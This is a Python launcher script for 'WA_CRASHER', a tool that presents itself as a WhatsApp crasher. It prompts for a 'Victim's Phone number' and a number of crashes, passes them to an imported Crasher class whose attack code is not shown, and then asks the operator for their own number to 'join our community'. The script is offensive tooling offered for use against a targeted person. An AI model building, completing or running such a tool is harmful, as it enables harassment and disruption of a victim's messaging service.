

import os
from serve.app import Crasher
from loguru import logger 

# Copyright (c) 2022 X PHANTOM (PH4N70M)

# Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
################################################
#  X PHANTOM (PH4N70M) refactored by (NCHIZA)  #
#Project : WA_CRASHER                          #
#Type    : Whatsapp - Crasher                  #
################################################

if __name__ == '__main__':

    logo = f"""
                                                                                                                
                
            __    __  _         ___   __    _    __          __  __  
            / / /\ \ \/_\       / __\ /__\  /_\  / _\  /\  /\/__\/__\ 
            \ \/  \/ //_\\     / /   / \// //_\\ \ \  / /_/ /_\ / \// 
            \  /\  /  _  \   / /___/ _  \/  _  \_\ \/ __  //__/ _  \ 
            \/  \/\_/ \_/___\____/\/ \_/\_/ \_/\__/\/ /_/\__/\/ \_/ 
                        |_____|                                      
                                                            

            XPHANTOM PH4N70M													  
    """

    os.system('clear')
	
    logger.info(logo)
	
    country_code = int(input(f' Enter Country Code WithOut "+" eg.91:'))
    phone_number = input(f" Enter the Victim's Phone number: +{country_code}")
    number_of_crashes = int(input(f" Enter the number of crashes you want:"))
    
    crasher = Crasher(phone_number, country_code, 5)
    crasher.crash(number_of_crashes)

    confirmation_phone_number = input(f" Enter your Phone number if you would like to join our community:")
    crasher.invite(confirmation_phone_number) 
    
  